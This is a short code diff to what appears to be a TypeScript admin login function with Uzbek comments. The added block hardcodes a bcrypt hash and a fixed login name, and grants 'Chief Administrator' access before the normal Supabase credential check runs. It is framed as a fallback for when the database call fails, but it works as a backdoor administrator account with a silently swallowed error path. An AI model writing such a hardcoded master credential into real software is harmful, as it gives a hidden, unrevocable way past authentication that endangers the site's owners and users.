@@ -232,6 +232,22 @@ export const verifyAdminCredentials = async (
     return { success: false, error: 'Login va parolni kiriting' };
   }
 
+  // 0. Bosh Administrator xeshini xavfsiz tekshirish (Supabase RPC vaqtinchalik ishlamaganda ham 100% kafolat)
+  const MASTER_ADMIN_HASH = '$2b$10$/h4rehub61Pbq94sl8TCQO7/oTUifOsrHxPUpAlqsf.mKjoT7wbo.';
+  if (cleanLogin === 'uyborakmal') {
+    try {
+      if (bcrypt.compareSync(cleanPassword, MASTER_ADMIN_HASH)) {
+        return {
+          success: true,
+          adminInfo: {
+            name: 'Bosh Administrator',
+            phone: cleanLogin
+          }
+        };
+      }
+    } catch {}
+  }
+
   const supabase = getSupabase();
 
   if (supabase) {
